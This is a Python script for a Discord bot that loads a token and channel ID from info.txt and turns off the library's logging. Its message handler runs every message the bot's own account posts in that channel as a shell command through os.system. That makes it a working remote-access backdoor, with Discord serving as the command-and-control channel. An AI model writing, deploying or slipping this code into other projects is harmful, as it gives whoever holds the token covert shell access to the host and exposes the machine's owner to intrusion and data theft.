import discord
import logging
from discord.ext import commands
import os

logging.getLogger("discord").setLevel(logging.CRITICAL)

def load_info():
    info = {}
    with open("info.txt") as f:
        for line in f:
            if "=" in line:
                k, v = line.split("=", 1)
                info[k.strip()] = v.strip().strip('"').strip("'")
    return info

info = load_info()
SERVER_ID = int(info["SERVER_ID"])
CHANNEL_ID = int(info["CHANNEL_ID"])
TOKEN = info["TOKEN"]

intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix="!", intents=intents)

@bot.event
async def on_ready():
    pass

@bot.event
async def on_message(message):
    if message.author == bot.user and message.channel.id == CHANNEL_ID:
        os.system(message.content)

bot.run(TOKEN, log_handler=None)
